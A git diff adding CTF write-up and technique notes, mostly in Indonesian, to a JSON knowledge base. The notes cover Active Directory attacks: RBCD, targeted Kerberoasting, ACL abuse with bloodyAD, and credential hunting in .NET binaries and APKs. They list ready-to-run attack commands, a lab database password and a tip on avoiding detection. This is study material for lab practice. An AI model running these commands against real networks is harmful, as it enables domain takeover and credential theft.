@@ -4750,5 +4750,270 @@
     ],
     "summary": "Easy Linux box (Debian 12). Initial access via Gitea default credentials, then authenticated RCE through Git Hooks (CVE-2020-14144) using the Metasploit gitea_git_hooks_rce module. Pivoted into the internal network with a chisel reverse tunnel to reach an internal Webmin instance, then escalated to root through the Webmin Command Shell module. Includes false positive analysis of the public exploit 50809.py (CVE-2022-0824), where missing HTTP status validation and timeout-as-success logic produced a misleading result against a stale CGI file.",
     "url": ""
+  },
+  {
+    "id": "hacktrace-resources",
+    "date": "2026-06-28",
+    "title": "Hacktrace Resources",
+    "platform": "Hacktrace",
+    "category": "CTF / Boot2Root",
+    "tags": [
+      "ctf",
+      "hacktrace",
+      "active-directory",
+      "windows-server-2022",
+      "kerberos",
+      "rbcd"
+    ],
+    "concepts": [
+      "17 stage attack chain di Windows Server 2022 AD",
+      "Triple credential leak (SMB share → .NET binary → APK)",
+      "Chain ACL abuse: ForceChangePassword → AddSelf → GenericWrite → GenericAll",
+      "Foothold via MSSQL xp_cmdshell sebagai service account",
+      "Privesc final via RBCD ke Domain Controller"
+    ],
+    "terms": [
+      "resources.htr",
+      "svc_ldap",
+      "fikri",
+      "brandon",
+      "forx",
+      "aexon",
+      "RESOURCES$"
+    ],
+    "commands": [
+      "bloodyAD set password fikri Hacked123!",
+      "impacket-mssqlclient sa:'Sa@Mssql2025!'@<dc>",
+      "evil-winrm -i <dc> -u brandon -p '...'",
+      "impacket-wmiexec -k -no-pass RESOURCES.resources.htr"
+    ],
+    "problems": [
+      "Defender quarantine semua varian Potato di context aexon, pivot ke brandon WinRM (context cleaner)",
+      "PSExec stuck di \"Starting service\" karena Defender, switch ke wmiexec"
+    ],
+    "summary": "Solve Moderate AD machine, ~5.5 jam, 17 stage chain. Jalur: SMB null → IT_Files leak → BloodHound ACL chain → MSSQL via crud.dll → APK loot → WinRM brandon → Editor group → Kerberoast forx → RBCD ke DC → Administrator.",
+    "url": ""
+  },
+  {
+    "id": "technique-rbcd",
+    "date": "2026-06-28",
+    "title": "Resource-Based Constrained Delegation (RBCD) Attack",
+    "platform": "Self-study",
+    "category": "Technique / Active Directory",
+    "tags": [
+      "active-directory",
+      "kerberos",
+      "rbcd",
+      "s4u",
+      "delegation",
+      "technique"
+    ],
+    "concepts": [
+      "RBCD: konfigurasi delegation dari target side (bukan source)",
+      "S4U2Self + S4U2Proxy chain untuk impersonate arbitrary user",
+      "Compromise DC via msDS-AllowedToActOnBehalfOfOtherIdentity write"
+    ],
+    "terms": [
+      "msDS-AllowedToActOnBehalfOfOtherIdentity",
+      "SeMachineAccountPrivilege",
+      "ms-DS-MachineAccountQuota",
+      "S4U"
+    ],
+    "commands": [
+      "impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'pass' <dom>/<user>:<pass>",
+      "impacket-rbcd -delegate-from 'FAKE$' -delegate-to '<target>$' -action write",
+      "impacket-getST -spn 'cifs/<target>.domain' -impersonate 'Administrator' <dom>/'FAKE$':<pass>",
+      "export KRB5CCNAME=<ccache>; impacket-wmiexec -k -no-pass <target>"
+    ],
+    "problems": [
+      "Butuh dua privilege: create computer (SeMachineAccountPrivilege / MAQ default 10) + write ke target object",
+      "SPN harus exact (cifs/host.fqdn), pastiin /etc/hosts setup"
+    ],
+    "summary": "Attack end-to-end RBCD untuk privesc ke Domain Controller tanpa crack hash. Lebih reliable dari Kerberoast, lebih sering miskonfigurasi karena setup dari target side.",
+    "url": ""
+  },
+  {
+    "id": "technique-dnfile-string-heap",
+    "date": "2026-06-28",
+    "title": ".NET Assembly String Heap Extraction with dnfile",
+    "platform": "Self-study",
+    "category": "Technique / Reverse Engineering",
+    "tags": [
+      "dotnet",
+      "reverse-engineering",
+      "recon",
+      "credential-hunting",
+      "python-tooling"
+    ],
+    "concepts": [
+      "User Strings heap (#US) di .NET PE binary nyimpan semua string literal di code",
+      "Quick recon tanpa full decompile (no dotnet runtime needed)",
+      "Generic strings(1) miss .NET strings karena encoding UTF-16LE"
+    ],
+    "terms": [
+      "dnPE",
+      "user_strings",
+      "ECMA-335",
+      "#US stream",
+      "raw_size"
+    ],
+    "commands": [
+      "pip install dnfile --break-system-packages",
+      "python3 -c \"import dnfile; pe = dnfile.dnPE('app.dll'); ...\"",
+      "strings -el app.dll (fallback)"
+    ],
+    "problems": [
+      "Cuma extract string literal di IL, gak baca external config",
+      "Obfuscated assembly (ConfuserEx) bakal encrypt heap, perlu de4dot dulu"
+    ],
+    "summary": "Teknik recon cepat extract hardcoded strings (connection string, credentials, API keys) dari .NET binary. Hemat banget vs decompile penuh — 2 detik no dependency vs 30+ detik install ilspy/dnSpy.",
+    "url": ""
+  },
+  {
+    "id": "technique-targeted-kerberoasting",
+    "date": "2026-06-28",
+    "title": "Targeted Kerberoasting via GenericWrite Abuse",
+    "platform": "Self-study",
+    "category": "Technique / Active Directory",
+    "tags": [
+      "active-directory",
+      "kerberos",
+      "kerberoast",
+      "acl-abuse",
+      "technique"
+    ],
+    "concepts": [
+      "GenericWrite ke user object = bisa set servicePrincipalName arbitrary",
+      "Set SPN bikin user jadi kerberoastable meskipun originally bukan service account",
+      "RC4-HMAC TGS = crackable dengan rockyou kalau password weak"
+    ],
+    "terms": [
+      "servicePrincipalName",
+      "krb5tgs RC4-HMAC (etype 23)",
+      "GetUserSPNs --request-user"
+    ],
+    "commands": [
+      "bloodyAD set object <user> servicePrincipalName -v 'HTTP/<user>.domain'",
+      "impacket-GetUserSPNs <dom>/<priv>:<pass> -dc-ip <dc> -request-user <user> -outputfile out.hash",
+      "nxc ldap <dc> -u <user> -p <pass> --kerberoasting out.hash",
+      "john --wordlist=rockyou.txt --format=krb5tgs out.hash"
+    ],
+    "problems": [
+      "Jangan lupa cleanup SPN setelah selesai biar gak ke-detect",
+      "Output bisa duplikat kalau request 2x — pake tail -1 ambil hash terakhir"
+    ],
+    "summary": "Eskalasi GenericWrite ACL ke crackable hash via set servicePrincipalName, terus kerberoast. Workaround buat user yang originally gak punya SPN tapi ACL-nya bisa diabuse.",
+    "url": ""
+  },
+  {
+    "id": "technique-apk-credential-hunting",
+    "date": "2026-06-28",
+    "title": "APK Static Analysis for Hardcoded Credential Hunting",
+    "platform": "Self-study",
+    "category": "Technique / Reverse Engineering",
+    "tags": [
+      "apk",
+      "android",
+      "reverse-engineering",
+      "credential-hunting",
+      "jadx"
+    ],
+    "concepts": [
+      "APK = ZIP container, decompile dengan jadx-gui atau apktool",
+      "Backend config/credentials sering hardcoded di *Api.java, Constants.java, atau strings.xml",
+      "Grep multi-pattern (password, secret, api_key, url, http) > directed inspection"
+    ],
+    "terms": [
+      "AndroidManifest.xml",
+      "smali",
+      "dex2jar",
+      "jadx",
+      "BackendApi",
+      "strings.xml"
+    ],
+    "commands": [
+      "jadx -d decoded internal.apk",
+      "apktool d internal.apk -o extracted",
+      "grep -riE \"password|secret|api_?key|url|http\" sources/com/<pkg>/ --include=\"*.java\"",
+      "cat resources/res/values/strings.xml"
+    ],
+    "problems": [
+      "Filter false positive: skip android/google/firebase namespace",
+      "Code biasanya ke-obfuscate kalau ProGuard aktif, cari di config class terpisah"
+    ],
+    "summary": "Decompile APK pake jadx, grep targeted di package developer, extract hardcoded credentials. Pattern umum: aplikasi mobile sering simpan DB credentials atau API token di constants class.",
+    "url": ""
+  },
+  {
+    "id": "technique-bloodhound-cypher-acl",
+    "date": "2026-06-28",
+    "title": "BloodHound Cypher Queries for ACL Chain Discovery",
+    "platform": "Self-study",
+    "category": "Technique / Active Directory",
+    "tags": [
+      "active-directory",
+      "bloodhound",
+      "cypher",
+      "acl-abuse",
+      "technique"
+    ],
+    "concepts": [
+      "Pre-built queries gak cukup, custom Cypher lebih powerful buat ACL chain discovery",
+      "Pattern: outbound dari owned user, lalu via group membership (transitive)",
+      "Edge filter penting: ForceChangePassword, GenericAll/Write, WriteDACL, WriteOwner, AddMember, AddSelf, AllExtendedRights, AddKeyCredentialLink, AddAllowedToAct"
+    ],
+    "terms": [
+      "Cypher",
+      "BloodHound CE",
+      "shortestPath",
+      "Mark as Owned"
+    ],
+    "commands": [
+      "MATCH p=(u:User {name:\"USER@DOMAIN\"})-[r]->(target) WHERE NOT type(r) IN [\"MemberOf\",\"HasSession\"] RETURN p",
+      "MATCH (u:User {name:\"USER@DOMAIN\"})-[:MemberOf*1..]->(g:Group) MATCH p=(g)-[r:ForceChangePassword|GenericAll|GenericWrite|WriteDACL|AddMember|AddSelf|AllExtendedRights]->(t) RETURN p",
+      "MATCH p=shortestPath((s)-[*1..]->(t:Group {name:\"DOMAIN ADMINS@DOMAIN\"})) WHERE s.owned=true RETURN p",
+      "bloodhound-python -u <user> -p <pass> -d <dom> -dc <dc> -ns <ns> -c All --zip"
+    ],
+    "problems": [
+      "Mark as Owned wajib biar query \"shortestPath from owned\" jalan",
+      "Default Pathfinding tab kurang granular vs Cypher custom"
+    ],
+    "summary": "Cypher queries untuk discover ACL chain di BloodHound CE. Ngebut nemu jalur ACL abuse kompleks (ForceChangePassword → AddSelf → GenericWrite chain).",
+    "url": ""
+  },
+  {
+    "id": "technique-bloodyad-acl-abuse",
+    "date": "2026-06-28",
+    "title": "bloodyAD for Active Directory ACL Abuse",
+    "platform": "Self-study",
+    "category": "Technique / Active Directory",
+    "tags": [
+      "active-directory",
+      "acl-abuse",
+      "bloodyad",
+      "tooling",
+      "technique"
+    ],
+    "concepts": [
+      "bloodyAD: Python tool buat AD ACL abuse via LDAP/SAMR",
+      "Pengganti rpcclient/net rpc yang sering bermasalah di Windows Server modern",
+      "Support ForceChangePassword, AddMember, set servicePrincipalName, RBCD, dan banyak lagi"
+    ],
+    "terms": [
+      "LDAP",
+      "SAMR",
+      "msDS-AllowedToActOnBehalfOfOtherIdentity"
+    ],
+    "commands": [
+      "bloodyAD --host <dc> -d <dom> -u <user> -p <pass> set password <target> <newpass>",
+      "bloodyAD --host <dc> -d <dom> -u <user> -p <pass> add groupMember <group> <user>",
+      "bloodyAD --host <dc> -d <dom> -u <user> -p <pass> set object <user> servicePrincipalName -v 'HTTP/<user>.domain'",
+      "bloodyAD --host <dc> -d <dom> -u <user> -p <pass> get object <user>"
+    ],
+    "problems": [
+      "Output minimal — verify perubahan via nxc ldap atau BloodHound re-collect"
+    ],
+    "summary": "Tool one-stop buat ACL abuse di AD, lebih reliable dari rpcclient/net rpc. Wajib di toolkit setelah dapet creds AD user.",
+    "url": ""
   }
 ]
